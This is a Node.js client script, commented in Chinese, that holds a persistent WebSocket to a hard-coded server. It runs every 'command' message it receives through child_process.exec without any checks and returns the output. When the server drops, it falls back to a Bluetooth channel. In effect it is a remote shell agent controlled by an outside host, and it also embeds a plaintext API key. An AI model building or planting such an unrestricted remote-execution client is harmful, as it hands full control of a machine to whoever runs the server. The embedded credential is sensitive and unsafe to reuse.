const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const noble = require('@abandonware/noble'); // 引入noble库以支持蓝牙

// 使用动态导入fetch
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const CONFIG_FILE = path.join(__dirname, 'config.json');

function timestampToTime(times) {
    let time = times[1]
    let mdy = times[0]
    mdy = mdy.split('/')
    let month = parseInt(mdy[0]);
    let day = parseInt(mdy[1]);
    let year = parseInt(mdy[2])
    return year + '-' + month + '-' + day + ' ' + time
}

// 日志函数
function log(message, type = 'info') {
    let time = new Date()
    let nowTime = timestampToTime(time.toLocaleString('en-US', { hour12: false }).split(" "))
    const prefix = type === 'error' ? '❌ ERROR' : '✅ INFO';
    console.log(`[${nowTime}] ${prefix}: ${message}`);
}

// 默认配置
const DEFAULT_CONFIG = {
    clientId: 'client-' + Math.random().toString(36).substr(2, 9),
    serverUrl: 'hz.srcandy.top:3080',
    apiKey: 'Bwzdc6530.',
    intervals: {
        check: 10000,    // 检查间隔
        ping: 10000,     // ping间隔
        pongTimeout: 5000, // pong超时
        maxRetry: 30000,   // 最大重试间隔
        initialRetry: 5000 // 初始重试间隔
    }
};

// 读取或创建配置
function getOrCreateConfig() {
    try {
        if (fs.existsSync(CONFIG_FILE)) {
            const savedConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
            // 合并保存的配置和默认配置，确保所有必要的字段都存在
            const config = {
                ...DEFAULT_CONFIG,
                ...savedConfig,
                intervals: {
                    ...DEFAULT_CONFIG.intervals,
                    ...(savedConfig.intervals || {})
                }
            };
            log(`从配置文件加载配置`);
            return config;
        }
    } catch (error) {
        log(`读取配置文件失败: ${error.message}`, 'error');
    }

    // 如果配置文件不存在或读取失败，使用默认配置
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(DEFAULT_CONFIG, null, 2));
        log(`创建新的配置文件`);
    } catch (error) {
        log(`保存配置文件失败: ${error.message}`, 'error');
    }
    return DEFAULT_CONFIG;
}

// 加载配置
const CONFIG = getOrCreateConfig();

let wsClient = null;
let isConnected = false;
let pingTimeout = null;
let lastPongTime = Date.now();
let reconnectTimer = null;
let currentRetryInterval = CONFIG.intervals.initialRetry;

// 蓝牙相关变量
let bluetoothDevice = null;
let bluetoothCharacteristic = null;

// 扫描并连接蓝牙设备
function scanAndConnectBluetooth() {
    noble.on('stateChange', async (state) => {
        if (state === 'poweredOn') {
            log('开始扫描蓝牙设备...');
            noble.startScanning();
        } else {
            noble.stopScanning();
        }
    });

    noble.on('discover', async (peripheral) => {
        log(`发现蓝牙设备: ${peripheral.advertisement.localName}`);
        if (peripheral.advertisement.localName === 'YourBluetoothDeviceName') {
            noble.stopScanning();
            bluetoothDevice = peripheral;
            bluetoothDevice.connect((error) => {
                if (error) {
                    log(`连接蓝牙设备失败: ${error.message}`, 'error');
                    return;
                }
                log('成功连接蓝牙设备');
                bluetoothDevice.discoverSomeServicesAndCharacteristics([], ['your-characteristic-uuid'], (error, services, characteristics) => {
                    if (error) {
                        log(`发现服务和特征失败: ${error.message}`, 'error');
                        return;
                    }
                    bluetoothCharacteristic = characteristics[0];
                    log('成功发现蓝牙特征');
                });
            });
        }
    });
}

// 通过蓝牙发送命令
function sendCommandViaBluetooth(command) {
    if (bluetoothCharacteristic) {
        bluetoothCharacteristic.write(Buffer.from(command), false, (error) => {
            if (error) {
                log(`通过蓝牙发送命令失败: ${error.message}`, 'error');
            } else {
                log('通过蓝牙发送命令成功');
            }
        });
    } else {
        log('蓝牙特征未找到，无法发送命令', 'error');
    }
}

async function getToken() {
    try {
        log('正在获取认证token...');
        const response = await fetch(`http://${CONFIG.serverUrl}/auth`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 
                apiKey: CONFIG.apiKey,
                clientId: CONFIG.clientId 
            })
        });
        const data = await response.json();
        if (!data.token) {
            throw new Error('获取token失败');
        }
        log(`成功获取token (ClientID: ${CONFIG.clientId})`);
        return data.token;
    } catch (error) {
        log(`获取token失败: ${error.message}`, 'error');
        throw error;
    }
}

function heartbeat() {
    clearTimeout(pingTimeout);
    lastPongTime = Date.now();
}

function checkPongTimeout() {
    const now = Date.now();
    if (now - lastPongTime > CONFIG.intervals.pongTimeout) {
        log('⚠️ 警告：服务器没有响应，连接可能已断开', 'error');
        if (wsClient) {
            wsClient.terminate(); // 强制关闭连接，这会触发close事件
        } else {
            scheduleReconnect();
        }
    }
}

function startHeartbeat() {
    if (wsClient.readyState === WebSocket.OPEN) {
        wsClient.ping();
        
        pingTimeout = setTimeout(() => {
            checkPongTimeout();
        }, CONFIG.intervals.pongTimeout);
    }
}

function executeCommand(command, ws) {
    log(`执行命令: ${command}`);
    exec(command, (error, stdout, stderr) => {
        const response = {
            command,
            success: !error,
            output: stdout || stderr,
            error: error ? error.message : null
        };

        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(response));
        } else {
            sendCommandViaBluetooth(JSON.stringify(response));
        }

        if (error) {
            log(`命令执行失败: ${error.message}`, 'error');
            if (stderr) {
                log('错误输出:', 'error');
                console.error(stderr);
            }
        } else {
            log(`命令执行成功: ${command}`);
            if (stdout) {
                log('命令输出:');
                console.log('------------------------');
                console.log(stdout.trim());
                console.log('------------------------');
            } else {
                log('命令执行完成，无输出');
            }
        }
    });
}

function scheduleReconnect() {
    if (reconnectTimer) {
        clearTimeout(reconnectTimer);
    }

    log(`将在 ${currentRetryInterval/1000} 秒后尝试重新连接...`);
    
    reconnectTimer = setTimeout(async () => {
        log('尝试重新连接...');
        try {
            await connectWebSocket();
        } catch (error) {
            currentRetryInterval = Math.min(currentRetryInterval * 1.5, CONFIG.intervals.maxRetry);
            scheduleReconnect();
        }
    }, currentRetryInterval);
}

async function connectWebSocket() {
    try {
        if (wsClient && wsClient.readyState === WebSocket.OPEN) {
            log('已存在活跃连接，无需重新连接');
            return;
        }

        const token = await getToken();
        wsClient = new WebSocket(`ws://${CONFIG.serverUrl}?token=${token}`);

        wsClient.on('open', () => {
            isConnected = true;
            log('已成功连接到服务器');
            currentRetryInterval = CONFIG.intervals.initialRetry;
            if (reconnectTimer) {
                clearTimeout(reconnectTimer);
                reconnectTimer = null;
            }
            startHeartbeat();
            setInterval(() => {
                startHeartbeat();
            }, CONFIG.intervals.ping);
        });

        wsClient.on('ping', () => {
            wsClient.pong();
        });

        wsClient.on('pong', () => {
            heartbeat();
        });

        wsClient.on('message', (message) => {
            try {
                const data = JSON.parse(message);
                if (data.type === 'command') {
                    log(`收到命令: ${data.command}`);
                    executeCommand(data.command, wsClient);
                }
            } catch (error) {
                log(`解析消息失败: ${error.message}`, 'error');
            }
        });

        wsClient.on('close', (code, reason) => {
            isConnected = false;
            clearTimeout(pingTimeout);
            log(`⚠️ 与服务器断开连接 (代码: ${code}, 原因: ${reason})`, 'error');
            scheduleReconnect();
            scanAndConnectBluetooth(); // 服务器断开时启动蓝牙扫描
        });

        wsClient.on('error', (error) => {
            isConnected = false;
            clearTimeout(pingTimeout);
            log(`⚠️ WebSocket错误: ${error.message}`, 'error');
        });
    } catch (error) {
        isConnected = false;
        log(`连接失败: ${error.message}`, 'error');
        scheduleReconnect();
        scanAndConnectBluetooth(); // 连接失败时启动蓝牙扫描
    }
}

// 处理进程退出
process.on('SIGINT', () => {
    log('正在关闭客户端...');
    clearTimeout(pingTimeout);
    clearTimeout(reconnectTimer);
    if (wsClient) {
        wsClient.close();
    }
    process.exit(0);
});

// 启动客户端
log('启动客户端...');
connectWebSocket();